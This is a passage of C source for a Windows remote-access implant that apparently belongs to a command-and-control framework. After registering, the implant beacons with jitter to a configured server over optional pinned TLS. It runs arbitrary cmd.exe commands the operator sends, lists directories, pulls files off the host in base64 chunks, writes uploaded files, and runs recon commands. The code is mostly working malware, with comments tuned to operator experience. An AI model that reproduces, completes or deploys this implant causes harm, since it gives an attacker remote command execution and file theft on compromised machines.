    UINT flags = MB_ERR_INVALID_CHARS;
    int wn = MultiByteToWideChar(CP_OEMCP, flags, bytes, (int)len, NULL, 0);
    if (wn <= 0) {
        wn = MultiByteToWideChar(CP_OEMCP, 0, bytes, (int)len, NULL, 0);
        flags = 0;
    }
    WCHAR *wide = wn > 0 ? (WCHAR *)malloc((size_t)wn * sizeof(WCHAR)) : NULL;
    char *utf8 = NULL;
    *out_len = 0;

    if (wide && MultiByteToWideChar(CP_OEMCP, flags, bytes, (int)len, wide, wn) == wn) {
        int cn = WideCharToMultiByte(CP_UTF8, 0, wide, wn, NULL, 0, NULL, NULL);
        if (cn > 0) {
            utf8 = (char *)malloc((size_t)cn + 1);
            if (utf8 && WideCharToMultiByte(CP_UTF8, 0, wide, wn, utf8, cn, NULL, NULL) == cn) {
                utf8[cn] = '\0';
                *out_len = (size_t)cn;
            } else {
                free(utf8);
                utf8 = NULL;
            }
        }
    }
    free(wide);

    if (!utf8) {
        utf8 = (char *)malloc(len + 1);
        if (!utf8) return NULL;
        size_t j = 0;
        for (size_t i = 0; i < len; i++)
            utf8[j++] = (unsigned char)bytes[i] < 0x80 ? bytes[i] : '?';
        utf8[j] = '\0';
        *out_len = j;
    }
    return utf8;
}

/* Run one command and report what it printed.
 *
 * Every buffer here is sized from the data it has to hold rather than from a
 * ceiling the data has to fit inside: escaping can turn one byte of output into
 * six, and a result that runs out of buffer is a result that arrives with its
 * tail missing and no indication that anything was dropped. */
static int send_error(SOCKET s, const char *cmd_id, const char *what);

static int send_output(SOCKET s, const char *cmd, const char *cmd_id) {
    char *raw = (char *)malloc(MAX_CMD_OUTPUT);
    if (!raw) return send_error(s, cmd_id, "out of memory");
    size_t raw_len = 0;
    exec_command(cmd, raw, MAX_CMD_OUTPUT, &raw_len);

    size_t text_len = 0;
    char *text = utf8_from_oem(raw, raw_len, &text_len);
    free(raw);
    if (!text) return send_error(s, cmd_id, "out of memory");

    size_t esc_sz = JSON_ESCAPED_MAX(text_len);
    char *escaped = (char *)malloc(esc_sz);
    char *msg = escaped ? (char *)malloc(esc_sz + 1024) : NULL;  /* + framing and ids */
    int rc;
    if (msg) {
        json_escape(text, text_len, escaped, esc_sz);
        snprintf(msg, esc_sz + 1024,
                 "{\"type\":\"output\",\"session_id\":\"%s\","
                 "\"command_id\":\"%s\",\"beacon\":\"%s\",\"output\":\"%s\"}",
                 g_session_id, cmd_id, g_beacon, escaped);
        rc = agent_send(s, msg);
    } else {
        /* A command that cannot be answered is not a command that was run:
         * with no reply it sits in the queue as `delivered` until it times out,
         * which an operator reads as a target that stopped rather than a payload
         * that ran short of memory. So say which — but only when there is no
         * result to say instead, because the listener resolves a command on the
         * first reply and a second one would be swallowed. */
        rc = send_error(s, cmd_id, "out of memory");
    }
    free(text);
    free(escaped);
    free(msg);
    return rc;
}

/* ── structured tasks ──
 *
 * A command line arriving from the server is one of two things: text for
 * cmd.exe, which is what this agent has always done, or a JSON task that names
 * an action and its arguments. The second shape is what makes file transfer
 * possible at all — an offset and 48 KB of base64 do not survive being typed
 * into a shell — and it is also the shape the recon modules and `sessions
 * download` use, so before this section existed every one of those taskings
 * reached a Windows host as a string cmd.exe had never seen, and its complaint
 * came back looking like an answer from the target.
 *
 * So the actions below are answered here, and only the actions below: what this
 * file reports at registration is exactly this list, which is why the two are
 * written near each other. An action that is not here is refused with the same
 * `{"error": "unknown action: ..."}` the Python agent gives, rather than being
 * passed to a shell that would produce something far more convincing.
 *
 * Paths cross the wire as UTF-8 and the file system is reached through the W
 * APIs, because the alternative is that an operator on a Chinese host cannot
 * pull a file whose name their own console typed correctly. Sizes are held to
 * what one reply can carry: a request for "the rest of the file" is a request
 * whose answer has to fit in memory twice over, on a host that may have little.
 */

/* One fs_get answer, before base64. The server sizes chunks to what fits one
 * line of its own accord; this is the belt on the braces, for a caller that
 * asks for the whole rest of a file. */
#define MAX_FS_READ (1024 * 1024)
#define PATH_BUF 4096
/* Entries one fs_list will report before saying it stopped. A directory with a
 * hundred thousand files is a real thing on a build agent, and the answer to it
 * would otherwise be a message big enough for the listener to drop. */
#define MAX_LIST_ENTRIES 2000

static int json_get_int(const char *json, const char *key, long long *out) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) return 0;
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
    char *end = NULL;
    long long value = strtoll(p, &end, 10);
    if (end == p) return 0;
    *out = value;
    return 1;
}

/* A string that grows as it is written to. Every reply below is built with this
 * rather than into a fixed buffer, because a JSON result that runs out of room
 * is a result the server cannot parse at all — the transfer stops in the middle
 * of a file and the operator reads a truncated one. */
typedef struct {
    char *buf;
    size_t len;
    size_t cap;
} sbuf;

static int sbuf_reserve(sbuf *b, size_t extra) {
    if (b->buf && b->len + extra + 1 <= b->cap) return 1;
    size_t want = b->cap ? b->cap * 2 : 8192;
    while (want < b->len + extra + 1) want *= 2;
    char *grown = (char *)realloc(b->buf, want);
    if (!grown) return 0;
    b->buf = grown;
    b->cap = want;
    return 1;
}

static int sbuf_add(sbuf *b, const char *data, size_t len) {
    if (!sbuf_reserve(b, len)) return 0;
    memcpy(b->buf + b->len, data, len);
    b->len += len;
    b->buf[b->len] = '\0';
    return 1;
}

static int sbuf_addf(sbuf *b, const char *fmt, ...) {
    va_list ap, ap2;
    va_start(ap, fmt);
    va_copy(ap2, ap);
    int need = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    if (need < 0) { va_end(ap2); return 0; }
    int ok = sbuf_reserve(b, (size_t)need);
    if (ok) {
        vsnprintf(b->buf + b->len, b->cap - b->len, fmt, ap2);
        b->len += (size_t)need;
    }
    va_end(ap2);
    return ok;
}

static void sbuf_free(sbuf *b) {
    free(b->buf);
    b->buf = NULL;
    b->len = b->cap = 0;
}

static const char B64_ALPHABET[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

#define B64_ENCODED_MAX(n) ((((n) + 2) / 3) * 4 + 1)

static size_t b64_encode(const unsigned char *src, size_t len, char *dst) {
    size_t o = 0;
    for (size_t i = 0; i < len; i += 3) {
        unsigned long v = (unsigned long)src[i] << 16;
        size_t rest = len - i;
        if (rest > 1) v |= (unsigned long)src[i + 1] << 8;
        if (rest > 2) v |= (unsigned long)src[i + 2];
        dst[o++] = B64_ALPHABET[(v >> 18) & 63];
        dst[o++] = B64_ALPHABET[(v >> 12) & 63];
        dst[o++] = rest > 1 ? B64_ALPHABET[(v >> 6) & 63] : '=';
        dst[o++] = rest > 2 ? B64_ALPHABET[v & 63] : '=';
    }
    dst[o] = '\0';
    return o;
}

static int b64_value(int c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/* Returns the number of bytes written, or -1 for input that is not base64 at
 * all. A chunk that fails to decode has to be reported as a failed write: a
 * silent stop would put a short file on the target and call the upload done. */
static long long b64_decode(const char *src, size_t src_len,
                            unsigned char *dst, size_t dst_sz) {
    unsigned long acc = 0;
    int bits = 0;
    size_t o = 0;
    for (size_t i = 0; i < src_len; i++) {
        if (src[i] == '=') break;
        int value = b64_value((unsigned char)src[i]);
        if (value < 0) return -1;
        acc = (acc << 6) | (unsigned long)value;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            if (o >= dst_sz) return -1;
            dst[o++] = (unsigned char)((acc >> bits) & 0xFF);
        }
    }
    return (long long)o;
}

static WCHAR *utf16_from_utf8(const char *bytes) {
    int n = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, bytes, -1, NULL, 0);
    if (n <= 0) n = MultiByteToWideChar(CP_UTF8, 0, bytes, -1, NULL, 0);
    if (n <= 0) return NULL;
    WCHAR *wide = (WCHAR *)malloc((size_t)n * sizeof(WCHAR));
    if (!wide) return NULL;
    if (MultiByteToWideChar(CP_UTF8, 0, bytes, -1, wide, n) <= 0) {
        free(wide);
        return NULL;
    }
    return wide;
}

static char *utf8_from_utf16(const WCHAR *wide) {
    int n = WideCharToMultiByte(CP_UTF8, 0, wide, -1, NULL, 0, NULL, NULL);
    if (n <= 0) return NULL;
    char *bytes = (char *)malloc((size_t)n);
    if (!bytes) return NULL;
    if (WideCharToMultiByte(CP_UTF8, 0, wide, -1, bytes, n, NULL, NULL) <= 0) {
        free(bytes);
        return NULL;
    }
    return bytes;
}

/* Report a finished result for a command. The text is already UTF-8 JSON built
 * above, so unlike a shell's output it needs no code-page conversion — only the
 * escaping that keeps it inside one JSON string. */
static int send_result(SOCKET s, const char *cmd_id, const char *text, size_t text_len) {
    size_t esc_sz = JSON_ESCAPED_MAX(text_len);
    char *escaped = (char *)malloc(esc_sz);
    char *msg = NULL;
    int rc = -1;
    if (escaped) {
        json_escape(text, text_len, escaped, esc_sz);
        msg = (char *)malloc(esc_sz + 1024);
    }
    if (msg) {
        snprintf(msg, esc_sz + 1024,
                 "{\"type\":\"output\",\"session_id\":\"%s\","
                 "\"command_id\":\"%s\",\"beacon\":\"%s\",\"output\":\"%s\"}",
                 g_session_id, cmd_id, g_beacon, escaped);
        rc = agent_send(s, msg);
    }
    free(escaped);
    free(msg);
    return rc;
}

/* A reply written in this file rather than assembled from what the target
 * holds. Its length is the string's own, so editing a literal later cannot
 * leave an escape count that runs past its end. */
static int send_literal(SOCKET s, const char *cmd_id, const char *text) {
    return send_result(s, cmd_id, text, strlen(text));
}

static int send_error(SOCKET s, const char *cmd_id, const char *what) {
    char *brief = (char *)malloc(strlen(what) + 24);
    if (!brief) return -1;
    snprintf(brief, strlen(what) + 24, "{\"error\":\"%s\"}", what);
    int rc = send_result(s, cmd_id, brief, strlen(brief));
    free(brief);
    return rc;
}

static int task_fs_list(SOCKET s, const char *task, const char *cmd_id) {
    char path[PATH_BUF];
    int have = json_get_whole_string(task, "path", path, sizeof(path));
    if (have < 0) return send_error(s, cmd_id, "that path is too long to arrive in one command");
    if (have <= 0 || !path[0]) snprintf(path, sizeof(path), ".");

    /* The pattern wants "dir\*" and a path that already ends in a separator
     * would give "dir\\*", which FindFirstFileW reads as nothing. */
    size_t plen = strlen(path);
    while (plen > 3 && (path[plen - 1] == '\\' || path[plen - 1] == '/'))
        path[--plen] = '\0';

    char *pattern = (char *)malloc(plen + 3);
    if (!pattern) return send_error(s, cmd_id, "out of memory");
    snprintf(pattern, plen + 3, "%s\\*", path);
    WCHAR *wide_pattern = utf16_from_utf8(pattern);
    free(pattern);
    if (!wide_pattern) return send_error(s, cmd_id, "path is not a name this host can read");

    WIN32_FIND_DATAW found;
    HANDLE handle = FindFirstFileW(wide_pattern, &found);
    free(wide_pattern);
    if (handle == INVALID_HANDLE_VALUE)
        return send_error(s, cmd_id, "no such directory, or it cannot be opened");

    char *escaped_path = (char *)malloc(JSON_ESCAPED_MAX(strlen(path)));
    sbuf out = {0};
    int first = 1, listed = 0, truncated = 0;
    if (!escaped_path) {
        /* No header, no array: sending the entries without the path they belong
         * to would be a listing that does not say what it lists. */
        FindClose(handle);
        return send_error(s, cmd_id, "out of memory");
    }
    json_escape(path, strlen(path), escaped_path, JSON_ESCAPED_MAX(strlen(path)));
    int header = sbuf_addf(&out, "{\"path\":\"%s\",\"entries\":[", escaped_path);
    free(escaped_path);
    if (!header) {
        FindClose(handle);
        sbuf_free(&out);
        return send_error(s, cmd_id, "out of memory");
    }

    do {
        if (listed >= MAX_LIST_ENTRIES) { truncated = 1; break; }
        if (!wcscmp(found.cFileName, L".") || !wcscmp(found.cFileName, L"..")) continue;
        char *name = utf8_from_utf16(found.cFileName);
        if (!name) {
            /* Dropping one entry in silence would make this listing a claim
             * about the directory that is not true; `truncated` says it is part
             * of one instead. */
            truncated = 1;
            break;
        }
        char *escaped_name = (char *)malloc(JSON_ESCAPED_MAX(strlen(name)));
        if (!escaped_name) {
            free(name);
            truncated = 1;
            break;
        }
        json_escape(name, strlen(name), escaped_name, JSON_ESCAPED_MAX(strlen(name)));
        free(name);

        LARGE_INTEGER size;
        size.HighPart = found.nFileSizeHigh;
        size.LowPart = found.nFileSizeLow;
        ULARGE_INTEGER stamp;
        stamp.HighPart = found.ftLastWriteTime.dwHighDateTime;
        stamp.LowPart = found.ftLastWriteTime.dwLowDateTime;
        int is_dir = (found.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        /* Windows file times are 100ns ticks since 1601; the Python agent reports
         * POSIX seconds, and a listing whose dates mean two things is a listing
         * nobody can compare across sessions. */
        double mtime = (double)(stamp.QuadPart / 10000000ULL) - 11644473600.0;

        if (!sbuf_addf(&out,
                       "%s{\"name\":\"%s\",\"is_file\":%s,\"is_dir\":%s,\"size\":%lld,\"mtime\":%.0f}",
                       first ? "" : ",", escaped_name,
                       is_dir ? "false" : "true", is_dir ? "true" : "false",
                       size.QuadPart, mtime)) {
            /* The entry that did not fit is left out and the array is closed
             * over the ones that did, which is a shorter listing rather than a
             * malformed one. */
            free(escaped_name);
            truncated = 1;
            break;
        }
        free(escaped_name);
        first = 0;
        listed++;
    } while (FindNextFileW(handle, &found));
    FindClose(handle);

    if (out.buf) {
        /* The marker goes after the array it is describing, and only ever when
         * the listing stopped early: a caller that cannot tell a full directory
         * from a truncated one reports the first as the whole truth. */
        sbuf_addf(&out, "]%s}", truncated ? ",\"truncated\":true" : "");
    }
    int rc = out.buf ? send_result(s, cmd_id, out.buf, out.len) : -1;
    sbuf_free(&out);
    return rc;
}

static int task_fs_get(SOCKET s, const char *task, const char *cmd_id) {
    char path[PATH_BUF];
    int have = json_get_whole_string(task, "path", path, sizeof(path));
    if (have < 0) return send_error(s, cmd_id, "that path is too long to arrive in one command");
    if (!path[0]) return send_error(s, cmd_id, "fs_get needs a path");

    long long offset = 0, want = 0;
    json_get_int(task, "offset", &offset);
    json_get_int(task, "length", &want);
    if (offset < 0) offset = 0;
    if (want <= 0 || want > MAX_FS_READ) want = MAX_FS_READ;

    WCHAR *wide_path = utf16_from_utf8(path);
    if (!wide_path) return send_error(s, cmd_id, "path is not a name this host can read");
    HANDLE handle = CreateFileW(wide_path, GENERIC_READ,
                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    free(wide_path);
    if (handle == INVALID_HANDLE_VALUE)
        return send_error(s, cmd_id, "cannot open that path");

    LARGE_INTEGER size = {0}, seek = {0};
    seek.QuadPart = offset;
    if (!GetFileSizeEx(handle, &size) || !SetFilePointerEx(handle, seek, NULL, FILE_BEGIN)) {
        CloseHandle(handle);
        return send_error(s, cmd_id, "cannot read that offset of the file");
    }

    char *data = (char *)malloc((size_t)want);
    if (!data) { CloseHandle(handle); return send_error(s, cmd_id, "out of memory"); }
    size_t got = 0;
    while (got < (size_t)want) {
        DWORD read_now = 0;
        if (!ReadFile(handle, data + got, (DWORD)(want - got), &read_now, NULL)) break;
        if (read_now == 0) break;
        got += read_now;
    }
    CloseHandle(handle);

    char *encoded = (char *)malloc(B64_ENCODED_MAX(got));
    if (!encoded) { free(data); return send_error(s, cmd_id, "out of memory"); }
    size_t encoded_len = b64_encode((unsigned char *)data, got, encoded);
    free(data);

    sbuf out = {0};
    int ok = sbuf_addf(&out,
                       "{\"size\":%lld,\"offset\":%lld,\"length\":%llu,\"eof\":%s,\"data\":\"",
                       size.QuadPart, offset, (unsigned long long)got,
                       (offset + (long long)got >= size.QuadPart) ? "true" : "false");
    if (ok) ok = sbuf_add(&out, encoded, encoded_len);
    if (ok) ok = sbuf_addf(&out, "\"}");
    free(encoded);

    int rc = ok ? send_result(s, cmd_id, out.buf, out.len)
                : send_error(s, cmd_id, "out of memory");
    sbuf_free(&out);
    return rc;
}

static int task_fs_put(SOCKET s, const char *task, const char *cmd_id) {
    char path[PATH_BUF];
    int have = json_get_whole_string(task, "path", path, sizeof(path));
    if (have < 0) return send_error(s, cmd_id, "that path is too long to arrive in one command");
    if (!path[0]) return send_error(s, cmd_id, "fs_put needs a path");

    long long offset = 0;
    json_get_int(task, "offset", &offset);
    if (offset < 0) offset = 0;

    /* The chunk travels as one JSON string, so the longest it can be is the
     * whole task; decoding cannot produce more than that either. */
    size_t task_len = strlen(task);
    char *encoded = (char *)malloc(task_len + 1);
    if (!encoded) return send_error(s, cmd_id, "out of memory");
    if (!json_get_string(task, "data", encoded, task_len + 1) || !encoded[0]) {
        free(encoded);
        return send_error(s, cmd_id, "fs_put needs data");
    }

    unsigned char *raw = (unsigned char *)malloc(strlen(encoded) + 1);
    if (!raw) { free(encoded); return send_error(s, cmd_id, "out of memory"); }
    long long written = b64_decode(encoded, strlen(encoded), raw, strlen(encoded) + 1);
    free(encoded);
    if (written < 0) {
        free(raw);
        return send_error(s, cmd_id, "that chunk is not base64; nothing was written");
    }

    WCHAR *wide_path = utf16_from_utf8(path);
    if (!wide_path) { free(raw); return send_error(s, cmd_id, "path is not a name this host can read"); }
    /* Offset 0 is the start of a new file and replaces whatever was there, the
     * way the Python agent's "wb" does; a later offset has to land in a file
     * that already exists, because writing at 500KB into nothing would produce
     * a file whose first half is whatever the disk happened to hold. */
    HANDLE handle = CreateFileW(wide_path, GENERIC_WRITE, 0, NULL,
                                offset ? OPEN_EXISTING : CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, NULL);
    free(wide_path);
    if (handle == INVALID_HANDLE_VALUE) {
        free(raw);
        return send_error(s, cmd_id, offset ? "the file is not there to write into"
                                            : "cannot create that path");
    }

    if (offset) {
        LARGE_INTEGER seek = {0};
        seek.QuadPart = offset;
        if (!SetFilePointerEx(handle, seek, NULL, FILE_BEGIN)) {
            CloseHandle(handle);
            free(raw);
            return send_error(s, cmd_id, "cannot seek to that offset");
        }
    }

    size_t placed = 0;
    while (placed < (size_t)written) {
        DWORD now = 0;
        if (!WriteFile(handle, raw + placed, (DWORD)(written - placed), &now, NULL) || now == 0)
            break;
        placed += now;
    }
    CloseHandle(handle);
    free(raw);

    if ((long long)placed != written)
        return send_error(s, cmd_id, "the write stopped short; the file is incomplete");

    char *escaped_path = (char *)malloc(JSON_ESCAPED_MAX(strlen(path)));
    sbuf out = {0};
    if (escaped_path) {
        json_escape(path, strlen(path), escaped_path, JSON_ESCAPED_MAX(strlen(path)));
        sbuf_addf(&out, "{\"ok\":true,\"path\":\"%s\",\"offset\":%lld,\"written\":%lld}",
                  escaped_path, offset, written);
        free(escaped_path);
    }
    int rc = out.buf ? send_result(s, cmd_id, out.buf, out.len) : -1;
    sbuf_free(&out);
    return rc;
}

/* The recon verbs this implant can honour without a handler of its own: the
 * answer is whatever the host's own tool says, which is the target speaking
 * rather than the agent's, and is the honest version of the same question. */
static const char *shell_for(const char *action) {
    if (!strcmp(action, "sysinfo")) return "systeminfo";
    if (!strcmp(action, "processes")) return "tasklist /v";
    if (!strcmp(action, "network")) return "ipconfig /all";
    return NULL;
}

static int handle_action(SOCKET s, const char *task, const char *action, const char *cmd_id) {
    if (!strcmp(action, "ping"))
        return send_literal(s, cmd_id, "{\"pong\":true}");
    if (!strcmp(action, "fs_list")) return task_fs_list(s, task, cmd_id);
    if (!strcmp(action, "fs_get")) return task_fs_get(s, task, cmd_id);
    if (!strcmp(action, "fs_put")) return task_fs_put(s, task, cmd_id);

    const char *as_shell = shell_for(action);
    if (as_shell) return send_output(s, as_shell, cmd_id);

    if (!strcmp(action, "shutdown")) {
        g_quit = 1;
        return send_literal(s, cmd_id, "{\"ok\":true,\"shutting_down\":true}");
    }

    if (!strcmp(action, "exec")) {
        char *line = (char *)malloc(strlen(task) + 1);
        if (!line) return send_error(s, cmd_id, "out of memory");
        json_get_string(task, "command", line, strlen(task) + 1);
        int rc = line[0] ? send_output(s, line, cmd_id)
                         : send_error(s, cmd_id, "exec needs a command");
        free(line);
        return rc;
    }

    /* An action this binary has never heard of. The Python agent's wording is
     * kept so that the same question reads the same whichever payload answered
     * it, and so that nothing here looks like output from the target. */
    char *unknown = (char *)malloc(strlen(action) + 48);
    if (!unknown) return -1;
    snprintf(unknown, strlen(action) + 48, "{\"error\":\"unknown action: %s\"}", action);
    int rc = send_result(s, cmd_id, unknown, strlen(unknown));
    free(unknown);
    return rc;
}

/* What a line that holds nothing but a verb means. The queue carries what the
 * operator typed rather than a task, so a word this implant announces has to be
 * answered here or it reaches cmd.exe, which reports "not recognized as an
 * internal or external command" about a question the payload could answer — and
 * the operator reads that as the target speaking. Only a line with nothing else
 * on it counts: `ping host.example` is the host's own ping program, and the
 * operator means that one. The Python agent's table is the wording this matches,
 * so `ps` and `exit` mean here what they mean there. */
static const char *bare_verb_action(const char *line) {
    char word[16];
    size_t i = 0, n = 0;
    while (line[i] == ' ' || line[i] == '\t') i++;
    while (line[i] && line[i] != ' ' && line[i] != '\t' &&
           line[i] != '\r' && line[i] != '\n' && n + 1 < sizeof(word)) {
        char c = line[i++];
        word[n++] = (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c;
    }
    word[n] = '\0';
    while (line[i] == ' ' || line[i] == '\t' || line[i] == '\r' || line[i] == '\n') i++;
    if (line[i]) return NULL;                 /* an argument: the shell's problem */
    if (!strcmp(word, "ping")) return "ping";
    if (!strcmp(word, "sysinfo")) return "sysinfo";
    if (!strcmp(word, "network")) return "network";
    if (!strcmp(word, "ps") || !strcmp(word, "processes")) return "processes";
    if (!strcmp(word, "fs_list")) return "fs_list";
    if (!strcmp(word, "exit") || !strcmp(word, "shutdown")) return "shutdown";
    return NULL;
}

static int run_task(SOCKET s, const char *task, const char *cmd_id) {
    if (task[0] == '{') {
        char action[64] = {0};
        if (json_get_string(task, "action", action, sizeof(action)) && action[0])
            return handle_action(s, task, action, cmd_id);
        /* A brace that is not a task is text, which is what an operator typing
         * `echo {hello}` means, and what this agent did with it before tasks
         * existed. */
    }
    const char *verb = bare_verb_action(task);
    if (verb) return handle_action(s, task, verb, cmd_id);
    return send_output(s, task, cmd_id);
}

static int handle_server_msg(SOCKET s, const char *line) {
    char msg_type[32] = {0};
    json_get_string(line, "type", msg_type, sizeof(msg_type));

    if (strcmp(msg_type, "registered") == 0) {
        char sid[64] = {0};
        char beacon[BEACON_SIZE] = {0};
        json_get_string(line, "session_id", sid, sizeof(sid));
        json_get_string(line, "beacon_token", beacon, sizeof(beacon));
        if (!sid[0] || !beacon[0]) {
            /* A server that answers registration without a token is one this
             * agent cannot beacon against: every checkin would be refused, and
             * the operator would see a session that reappears and never takes a
             * command. Say so once rather than pretend to be alive. */
            g_fatal = 1;
            return -1;
        }
        strncpy_s(g_session_id, sizeof(g_session_id), sid, _TRUNCATE);
        strncpy_s(g_beacon, sizeof(g_beacon), beacon, _TRUNCATE);
        return 0;
    }

    if (strcmp(msg_type, "ack") == 0) return 0;

    if (strcmp(msg_type, "error") == 0) {
        char why[64] = {0};
        json_get_string(line, "message", why, sizeof(why));
        if (strcmp(why, "auth_failed") == 0 || strcmp(why, "unknown_session") == 0) {
            /* auth_failed: built by a server that is not this one.
             * unknown_session: the server has forgotten us, and re-registering
             * from the top of main() is the way back. */
            g_fatal = (strcmp(why, "auth_failed") == 0);
        }
        return -1;
    }

    if (strcmp(msg_type, "commands") == 0) {
        const char *arr_start = strstr(line, "\"commands\"");
        if (!arr_start) return 0;
        arr_start = strchr(arr_start, '[');
        if (!arr_start) return 0;

        const char *p = arr_start + 1;
        while (*p) {
            while (*p && *p != '{') {
                if (*p == ']') return 0;
                p++;
            }
            if (!*p) break;

            const char *obj_start = p;
            const char *obj_end = json_object_end(p);
            if (!obj_end) return -1;   /* a line that does not hold a whole task */
            size_t obj_len = (size_t)(obj_end - obj_start);
            /* Both buffers are sized from the object instead of from a fixed
             * ceiling: a base64-encoded PowerShell command runs past a kilobyte
             * on its own, and a command truncated here is a different command
             * on the target, not a command that failed. */
            char *obj = (char *)malloc(obj_len + 1);
            char cmd_id[64] = {0};
            if (!obj) return -1;
            memcpy(obj, obj_start, obj_len);
            obj[obj_len] = '\0';
            json_get_string(obj, "command_id", cmd_id, sizeof(cmd_id));

            char *cmd = (char *)malloc(obj_len + 1);
            if (!cmd) {
                free(obj);
                /* Answer rather than drop: the listener has already marked this
                 * command delivered, so a payload that stays quiet about it
                 * leaves the operator waiting on a task that was never run. */
                send_error(s, cmd_id, "out of memory");
                return -1;
            }
            json_get_string(obj, "command", cmd, obj_len + 1);
            free(obj);

            int ran = cmd[0] ? run_task(s, cmd, cmd_id) : 0;
            free(cmd);
            if (ran != 0) return -1;
            p = obj_end;
        }
        return 0;
    }

    return 0;
}

/* ── main ── */

int main(void) {
    WSADATA wsa;
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    get_hostname();
    get_username();

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    g_tls_on = AGENT_TLS;

    while (1) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)AGENT_PORT);
        inet_pton(AF_INET, AGENT_HOST, &addr.sin_addr);

        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            close_conn(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        if (g_tls_on) {
            int rc = tls_handshake(s);
            if (rc != 0) {
                close_conn(s);
                if (rc == -2) {
                    /* Something else answers on that port with a certificate
                     * this payload was not built against: a team server that
                     * regenerated its certificate, or a host that is not ours.
                     * Every retry would say the same thing, so say it once and
                     * stop rather than keep knocking. */
                    g_fatal = 1;
                    break;
                }
                jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
                continue;
            }
        }

        g_session_id[0] = '\0';
        g_beacon[0] = '\0';
        if (handle_register(s) != 0) {
            close_conn(s);
            if (g_fatal) break;
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        char line[RECV_BUF_SIZE];
        if (agent_readline(s, line, sizeof(line)) < 0) {
            close_conn(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }
        if (handle_server_msg(s, line) != 0) {
            close_conn(s);
            if (g_fatal) break;
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        while (1) {
            char checkin[SEND_BUF_SIZE];
            snprintf(checkin, sizeof(checkin),
                     "{\"type\":\"checkin\",\"session_id\":\"%s\",\"beacon\":\"%s\"}",
                     g_session_id, g_beacon);
            if (agent_send(s, checkin) != 0) break;

            if (agent_readline(s, line, sizeof(line)) < 0) break;
            if (handle_server_msg(s, line) != 0) break;
            /* Asked to stop, and the answer is on its way back on this same
             * connection: beaming once more after that would be a payload
             * calling home to a session the server has already written off. */
            if (g_quit) break;

            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
        }

        close_conn(s);
        if (g_fatal || g_quit) break;
        jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
    }

    WSACleanup();
    /* 3 is what the Python agent exits with for the same failure, so whichever
     * payload an operator drops, the exit code means the same thing. */
    return g_fatal ? 3 : 0;
}
